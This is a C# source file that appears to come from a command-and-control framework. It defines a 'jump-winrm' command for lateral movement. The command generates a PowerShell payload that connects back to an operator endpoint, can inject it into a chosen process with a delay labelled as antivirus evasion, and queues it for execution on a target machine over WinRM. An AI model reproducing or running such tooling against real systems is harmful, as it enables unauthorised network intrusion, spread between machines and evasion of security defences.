using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Executor;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using Common.Payload;
using Common;
using Shared;
using Commander.Commands.Agent;
using Microsoft.VisualBasic.FileIO;

namespace Commander.Commands
{
    public class JumpWinRMCommandOptions
    {
        public string target { get; set; }
        public string endpoint { get; set; }
        public bool debug { get; set; }
        public bool inject { get; set; }

        public int injectDelay { get; set; }

        public string injectProcess { get; set; }
        public bool x86 { get; set; }

        public bool verbose { get; set; }


        public string serverKey { get; set; }
    }
    internal class JumpWinRMCommand : EndPointCommand<JumpWinRMCommandOptions>
    {
        public override CommandId CommandId => CommandId.Winrm;
        public override string Category => CommandCategory.LateralMovement;
        public override string Description => "Using winrm to jump to the target machine";
        public override string Name => "jump-winrm";

        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("target"),
            new Option<string>(new[] { "--endpoint", "-b" }, () => "pipe://127.0.0.1:winrm", "EndPoint to Bind To"),
            new Option<string>(new[] { "--serverKey", "-k" }, () => null, "The server unique key of the endpoint"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
            new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
             new Option<int>(new[] { "--injectDelay", "-id" },() => 30, "Delay before injection (AV evasion)"),
             new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
        };

        protected override async Task<bool> Body(CommandContext<JumpWinRMCommandOptions> context)
        {
            var agent = context.Executor.CurrentAgent;
            if (string.IsNullOrEmpty(context.Options.endpoint))
            {
                context.Terminal.WriteLine($"No Endpoint selected, taking the current agent endpoint ({agent.Metadata.EndPoint})");
                context.Options.endpoint = agent.Metadata.EndPoint;
            }

            var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
            if (!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            context.Terminal.WriteLine($"[>] Generating powershell payload...");

            var options = new PayloadGenerationOptions()
            {
                Architecture = context.Options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = context.Options.debug,
                IsVerbose = context.Options.verbose,
                ServerKey = string.IsNullOrEmpty(context.Options.serverKey) ? context.Config.ServerConfig.Key : context.Options.serverKey,
                Type = PayloadType.PowerShell,
                InjectionDelay = context.Options.injectDelay,
                IsInjected = context.Options.inject,
                InjectionProcess = context.Options.injectProcess,
            };

            var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);

            if (pay == null)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                context.Terminal.WriteSuccess($"[+] Generation succeed!");

            context.AddParameter(ParameterId.Command, Encoding.UTF8.GetString(pay));
            context.AddParameter(ParameterId.Target, context.Options.target);
            return true;
        }

    }
}
